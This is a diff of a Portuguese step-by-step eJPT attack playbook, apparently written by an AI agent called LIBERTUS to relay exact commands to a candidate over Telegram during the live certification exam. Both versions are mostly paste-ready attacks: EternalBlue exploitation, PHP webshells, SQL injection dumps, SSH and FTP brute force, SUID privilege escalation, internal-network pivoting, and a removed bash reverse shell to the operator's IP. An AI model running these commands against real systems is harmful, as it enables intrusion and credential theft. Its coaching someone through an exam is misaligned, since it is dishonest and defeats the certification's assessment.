@@ -1,272 +1,233 @@
-# CENARIOS eJPT - COMANDOS EXATOS
-Lorran, identifique o cenario, copie e cole os blocos na ordem.
-Me manda o output de cada etapa antes de continuar.
+# CENÁRIOS eJPT — Playbooks Passo a Passo
+LIBERTUS · 2026-07-01 · comandos exatos que vou mandar pro Lorran no Telegram.
+Regra de ouro: **1 linha de contexto + 1 comando + "me manda o output"**. Sem enrolação.
+`<IP>` = alvo · `<KALI>` = meu IP (do `ip addr`).
 
-===================================================================
-## CENARIO 1: PORTA 445 ABERTA → MS17-010 (EternalBlue)
-===================================================================
+---
 
-### ETAPA 1 - Confirmar vulnerabilidade
-nmap --script smb-vuln-ms17-010 -p 445 10.10.10.X
+## CENÁRIO A — Porta 445 aberta (SMB) → MS17-010 EternalBlue
 
-### OUTPUT ESPERADO (vulneravel):
-# Host script results:
-# | smb-vuln-ms17-010:
-# |   VULNERABLE:
+**Passo 1 — confirmar a vuln:**
+```bash
+nmap -p445 --script smb-vuln-ms17-010 <IP>
+```
+→ me manda o output. Se disser "VULNERABLE" seguimos.
 
-### ETAPA 2 - Iniciar Metasploit e configurar exploit
-msfconsole -q
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 10.10.10.X
-set LHOST 10.10.10.SUA_IP
-set LPORT 4444
-set payload windows/x64/meterpreter/reverse_tcp
-show options
-run
+**Passo 2 — pegar meu IP:**
+```bash
+ip addr
+```
+→ me manda (preciso do IP do Kali para o LHOST).
 
-### ETAPA 3 - Dentro do Meterpreter (confirmacao)
+**Passo 3 — explorar (ONELINER, cola tudo de uma vez):**
+```bash
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <IP>; set LHOST <KALI>; run"
+```
+→ me manda o output. Se abrir "meterpreter >" ganhamos shell.
+
+**Passo 4 — pós-exploração:**
+```
 getuid
 sysinfo
-ipconfig
-
-### ETAPA 4 - Coletar informacoes
-hashdump
-run post/windows/gather/enum_shares
-run post/windows/gather/enum_applications
+```
+Se `getuid` = NT AUTHORITY\SYSTEM → somos admin. Para pegar flag:
+```
 shell
-
-### ETAPA 5 - Dentro do shell Windows
-whoami
-whoami /priv
-net user
-net localgroup administrators
 type C:\Users\Administrator\Desktop\flag.txt
-dir C:\Users\
+```
 
-### SE FALHAR (try fallback):
-use exploit/windows/smb/ms17_010_psexec
-set RHOSTS 10.10.10.X
-set LHOST 10.10.10.SUA_IP
-set SMBUser Administrator
-run
+**Se der "Cannot reliably check exploitability":** manda no msf `set ForceExploit true` e `run`.
+**Se SMB não confirmar ms17-010:** testar `smb-os-discovery` p/ versão, e enumerar shares:
+`nmap -p445 --script smb-enum-shares,smb-enum-users <IP>`
 
-===================================================================
-## CENARIO 2: PORTA 21 ABERTA → FTP ANONYMOUS + BRUTE FORCE
-===================================================================
+---
 
-### ETAPA 1 - Verificar anonymous login
-nmap --script ftp-anon -p 21 10.10.10.X
+## CENÁRIO B — Porta 21 aberta (FTP) → anônimo + creds fracas
 
-### OUTPUT ESPERADO se anonymous OK:
-# | ftp-anon: Anonymous FTP login allowed
+**Passo 1 — testar login anônimo:**
+```bash
+nmap -p21 --script ftp-anon <IP>
+```
+→ se aparecer "Anonymous FTP login allowed", entramos.
 
-### ETAPA 2 - Conectar manualmente como anonymous
-ftp 10.10.10.X
-# usuario: anonymous
-# senha: (enter em branco ou qualquer email)
+**Passo 2 — entrar e listar tudo:**
+```bash
+ftp <IP>
+```
+Login: `anonymous` · senha: (só Enter). Depois:
+```
 ls -la
-get arquivo_interessante.txt
-mget *
+```
+→ me manda o que aparecer. Procuramos: .txt (dicas/creds), webshells (.aspx/.php), backups.
 
-### ETAPA 3 - Verificar versao do FTP
-nmap -sV -p 21 10.10.10.X
+**Passo 3 — baixar arquivos interessantes:**
+```
+get updates.txt /tmp/updates.txt
+get config.txt /tmp/config.txt
+bye
+```
+Depois: `cat /tmp/updates.txt` → me manda.
+(Na sessão real, updates.txt tinha a dica "usernames = passwords".)
 
-### SE VSFTPD 2.3.4 (backdoor!):
-msfconsole -q
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 10.10.10.X
-run
-# Shell direto como root!
+**Passo 4 — se tiver webshell (.aspx/.php) no dir web:**
+Abrir no Chrome: `http://<IP>/cmdasp.aspx` → executa comandos Windows no campo de texto.
+`ipconfig /all`, `whoami`, `arp -a`.
 
-### ETAPA 4 - Brute force FTP (se nao anonymous)
-hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.X -t 4 -f
-# Se nao tiver SecLists, crie uma lista:
-echo -e "admin\nftp\nuser\nroot\nanonymous" > users_ftp.txt
-echo -e "admin\npassword\n123456\nftp\nanonymous\n" > pass_ftp.txt
-hydra -L users_ftp.txt -P pass_ftp.txt ftp://10.10.10.X -t 4 -f
+**Passo 5 — se não achou nada, brute force com creds fracas:**
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 4 -f
+```
+Antes disso testar manual: admin/admin, root/root, ftp/ftp, anonymous.
 
-### ETAPA 5 - Apos login FTP, verificar se pode upload (webshell)
-ftp 10.10.10.X
-# Logar com credenciais encontradas
-put webshell.php
-# Se subir arquivo PHP, acessar via navegador!
+---
 
-### Conteudo webshell PHP simples:
-# echo '<?php system($_GET["cmd"]); ?>' > webshell.php
-# Depois acesse: http://10.10.10.X/webshell.php?cmd=whoami
+## CENÁRIO C — Porta 80/8080 aberta (web) → gobuster + sqli + webshell
 
-===================================================================
-## CENARIO 3: PORTA 80 / 8080 → GOBUSTER + SQLMAP + WEBSHELL
-===================================================================
+**Passo 1 — identificar o app:**
+```bash
+nmap -p80 --script http-title,http-headers,http-enum <IP>
+```
+→ me manda. Vejo se é WordPress, Drupal, app custom.
 
-### ETAPA 1 - Verificar o que tem
-curl -s http://10.10.10.X/ | head -20
-curl -I http://10.10.10.X/
+**Passo 2 — enumerar diretórios:**
+```bash
+gobuster dir -u http://<IP> -w /usr/share/wordlists/common.txt -x php,txt,bak -t 30 -q
+```
+→ me manda. Foco em: /admin, /login, /upload, /config, arquivos .bak.
 
-### ETAPA 2 - Gobuster (enumeracao de diretorios)
-gobuster dir -u http://10.10.10.X -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 50 -o gobuster_result.txt
+**Passo 3 — SQL injection (se achar página com ?id= ou login):**
+```bash
+sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs
+```
+Depois extrair users:
+```bash
+sqlmap -u "http://<IP>/page.php?id=1" -D nomedb -T users --dump --batch
+```
+→ me manda tabela de usuários/senhas.
 
-### SE SecLists disponivel (mais completo):
-gobuster dir -u http://10.10.10.X -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o gobuster_medium.txt
+**Passo 4 — upload de webshell (se achar /upload ou file upload):**
+PHP webshell simples:
+```php
+<?php system($_GET['c']); ?>
+```
+Salvar como shell.php, subir, acessar: `http://<IP>/uploads/shell.php?c=id`
+(⚠️ no lab INE o "?" não digita no terminal — acessar URL na barra do Chrome.)
 
-### Ver resultados
-cat gobuster_result.txt | grep -v "404"
+**Passo 5 — se for WordPress:**
+```bash
+curl -s -H "Host: wordpress.local" http://<IP>/ | grep -i themes
+```
+Para Drupal → Drupalgeddon2:
+```bash
+msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <IP>; set TARGETURI /drupal; run"
+```
 
-### ETAPA 3 - Identificar parametros vulneraveis
-# Teste manual: http://10.10.10.X/page.php?id=1'
-# Se der erro SQL, use sqlmap:
-sqlmap -u "http://10.10.10.X/page.php?id=1" --dbs --batch
-sqlmap -u "http://10.10.10.X/page.php?id=1" -D banco_encontrado --tables --batch
-sqlmap -u "http://10.10.10.X/page.php?id=1" -D banco_encontrado -T users --dump --batch
+---
 
-### SQLmap em formulario POST:
-sqlmap -u "http://10.10.10.X/login.php" --data="username=admin&password=test" --dbs --batch
+## CENÁRIO D — Porta 22 aberta (SSH) → creds + brute force
 
-### ETAPA 4 - Upload de Webshell
-# Se encontrar /upload ou /admin/upload via gobuster:
+**Passo 1 — banner e versão:**
+```bash
+nmap -p22 -sV <IP>
+```
 
-# Criar webshell PHP:
-echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
+**Passo 2 — SEMPRE testar creds achadas antes de brutar.**
+Se algum arquivo/CMS deu usuário:senha, testar direto:
+```bash
+ssh usuario@<IP>
+```
+Reutilização de credenciais é TEMA RECORRENTE no eJPT.
 
-# Se tiver filtro de extensao, tentar:
-# shell.php5, shell.phtml, shell.php.jpg
+**Passo 3 — brute force direcionado (NÃO rockyou inteiro em SSH — leva horas):**
+```bash
+# lista curta de users prováveis:
+hydra -L /tmp/users.txt -P /tmp/pass_curta.txt ssh://<IP> -t 4 -f -V
+```
+Ou via metasploit:
+```bash
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS <IP>; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run"
+```
 
-# Apos upload, acessar:
-curl "http://10.10.10.X/uploads/shell.php?cmd=id"
-curl "http://10.10.10.X/uploads/shell.php?cmd=whoami"
-curl "http://10.10.10.X/uploads/shell.php?cmd=cat+/etc/passwd"
+**Passo 4 — se achar chave SSH privada (id_rsa) em algum lugar:**
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa usuario@<IP>
+# se a chave tiver senha:
+ssh2john id_rsa > /tmp/keyhash
+~/LIBERTUS/ejpt/john_home/jl.sh /tmp/keyhash
+```
 
-### ETAPA 5 - Escalar para reverse shell via webshell
-# Na sua maquina, escutar:
-nc -lvnp 4444
+**Passo 5 — dentro do SSH, privesc:**
+```bash
+id; sudo -l; find / -perm -4000 2>/dev/null
+# SUID find → root:
+/usr/bin/find . -exec /bin/sh -p \; -quit
+```
 
-# Via webshell (URL encode o & como %26):
-curl "http://10.10.10.X/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/SEU_IP/4444+0>%261"
+---
 
-===================================================================
-## CENARIO 4: PORTA 22 ABERTA → HYDRA SSH
-===================================================================
+## CENÁRIO E — Rede /24 descoberta → PIVOTING (Metasploit)
 
-### ETAPA 1 - Verificar versao SSH
-nmap -sV -p 22 10.10.10.X
-nmap --script ssh-auth-methods -p 22 10.10.10.X
+Este foi o GAP da 1ª tentativa. Fluxo completo:
 
-### ETAPA 2 - Tentar credenciais comuns primeiro (manual)
-ssh admin@10.10.10.X
-ssh root@10.10.10.X
-# Senhas: admin, password, 123456, root, toor
+**Passo 1 — já tenho sessão meterpreter num host (ex: .52). Descobrir a rede interna:**
+No meterpreter cai no shell e roda:
+```
+ipconfig /all      (Windows)   OU   ip addr; ip route   (Linux)
+arp -a
+```
+→ me manda. Procuro um 2º range (ex: DNS Server 192.168.0.2 → rede 192.168.0.0/24).
 
-### ETAPA 3 - Brute force com hydra
-# Usuario conhecido, wordlist de senhas:
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4 -f
-
-# Lista de usuarios + wordlist:
-hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4 -f
-
-# Se porta SSH nao for 22:
-hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://10.10.10.X -t 4 -f
-
-### Lista minima de usuarios para tentar (copiar e colar):
-echo -e "admin\nroot\nuser\nlorran\nftpuser\nwebadmin\nservice\ntest" > users_ssh.txt
-
-### Lista minima de senhas para tentar:
-echo -e "admin\npassword\n123456\npassword123\nadmin123\nroot\ntoor\nletmein\nqwerty\nwelcome\nservice\ntest" > pass_ssh.txt
-
-hydra -L users_ssh.txt -P pass_ssh.txt ssh://10.10.10.X -t 4 -f -V
-
-### ETAPA 4 - Conectar apos encontrar credenciais
-ssh usuario@10.10.10.X
-# Digitar senha encontrada pelo hydra
-
-### ETAPA 5 - Dentro do SSH, coletar info
-id
-whoami
-sudo -l          # verificar permissoes sudo
-cat /etc/passwd
-find / -perm -u=s -type f 2>/dev/null    # binarios SUID
-find / -writable -type f 2>/dev/null | head -20
-cat /home/*/flag*.txt 2>/dev/null
-cat /root/flag.txt 2>/dev/null
-
-===================================================================
-## CENARIO 5: REDE /24 → PIVOTING COM METASPLOIT
-===================================================================
-
-### SITUACAO: Voce comprometeu 10.10.10.X e quer atacar 192.168.1.0/24
-
-### ETAPA 1 - Confirmar sessao Meterpreter ativa
-msfconsole -q
-sessions -l
-sessions -i 1
-
-### ETAPA 2 - Mapear redes da maquina comprometida
-# Dentro do Meterpreter:
-ipconfig
-route
-
-### ETAPA 3 - Adicionar rota para rede interna
-# Dentro do Meterpreter - colocar em background primeiro:
+**Passo 2 — adicionar rota (do meterpreter, com a sessão em background):**
+```
+run autoroute -s 192.168.0.0/24
+```
+Ou:
+```
 background
-# No msfconsole:
-route add 192.168.1.0/24 1
-route print
-
-### ETAPA 4 - Ou usar autoroute (mais simples)
-# Ainda na sessao 1:
 use post/multi/manage/autoroute
 set SESSION 1
-set SUBNET 192.168.1.0
-set NETMASK 255.255.255.0
+set SUBNET 192.168.0.0
 run
-back
+```
 
-### ETAPA 5 - Descobrir hosts vivos na rede interna
-use auxiliary/scanner/discovery/arp_sweep
-set RHOSTS 192.168.1.0/24
-set SESSION 1
-run
-
-### ETAPA 6 - Scanner de portas pela rede pivotada
+**Passo 3 — scan da rede interna PELA rota:**
+```
 use auxiliary/scanner/portscan/tcp
-set RHOSTS 192.168.1.0/24
-set PORTS 22,80,135,139,443,445,3389,8080
-set THREADS 10
+set RHOSTS 192.168.0.1-254
+set PORTS 22,80,445,3389,10000
 run
+```
+→ me manda os hosts/portas que aparecerem.
 
-### ETAPA 7 - Portfwd (tunel para porta especifica)
-# Entrar na sessao novamente:
+**Passo 4 — port forward para atacar host interno direto:**
+```
 sessions -i 1
-# Criar tunel: localhost:8445 → 192.168.1.50:445
-portfwd add -l 8445 -r 192.168.1.50 -p 445
-# Criar tunel RDP: localhost:13389 → 192.168.1.50:3389
-portfwd add -l 13389 -r 192.168.1.50 -p 3389
+portfwd add -l 3389 -p 3389 -r 192.168.0.50
+```
+Agora `127.0.0.1:3389` no Kali → chega no .50 interno.
 
-### ETAPA 8 - Usar SOCKS proxy para acesso total
-background
+**Passo 5 — socks proxy + proxychains (ferramentas externas):**
+```
 use auxiliary/server/socks_proxy
-set SRVPORT 1080
-set VERSION 5
-run -j
+set VERSION 4a
+run
+```
+Editar `/etc/proxychains.conf` → `socks4 127.0.0.1 1080`. Depois:
+```bash
+proxychains nmap -sT -Pn -p 445 192.168.0.50
+proxychains msfconsole      # exploits pela rota
+```
 
-### ETAPA 9 - Configurar proxychains
-# Editar /etc/proxychains4.conf (ou proxychains.conf):
-# Adicionar no final: socks5 127.0.0.1 1080
-echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+**Comandos-chave para questões teóricas:** `autoroute` (adicionar rota),
+`portfwd` (encaminhar porta), `socks_proxy`+`proxychains` (tunelar ferramentas).
 
-### ETAPA 10 - Usar nmap e ferramentas via proxy
-proxychains nmap -sT -Pn 192.168.1.50
-proxychains curl http://192.168.1.50
-proxychains ssh user@192.168.1.50
+---
 
-===================================================================
-## DICAS GERAIS DE EXAME
-
-- SEMPRE salve outputs: comando | tee output.txt
-- Anote cada IP e porta encontrada em notas.txt
-- Me manda screenshot ou output completo do nmap ANTES de tentar exploit
-- Flags geralmente em: /root/flag.txt, /home/user/flag.txt, C:\Users\Administrator\Desktop\flag.txt
-- Se meterpreter cair, rode o exploit novamente
-- Hashdump sempre depois de comprometer Windows
-
-===================================================================
-FIM DOS CENARIOS
+## Regras transversais (TODOS os cenários)
+1. **Sempre começar com nmap na rede inteira.** `nmap -sn` depois `-sV` em cada host.
+2. **Anotar tudo:** IPs, portas, versões, credenciais. Cada questão puxa desses dados.
+3. **Reutilizar credenciais em TODOS os serviços** — tema recorrente do exame.
+4. **48h é muito tempo** — não apressar, mas não travar: após 2 tentativas falhas no mesmo vetor, trocar.
+5. **Copy/paste bugado no lab INE** → usar oneliner `msfconsole -q -x`, webshell, ou Telegram.
+6. **Caractere "?" não digita no Kali INE** → URLs com ? na barra do Chrome, ou python3 -c.
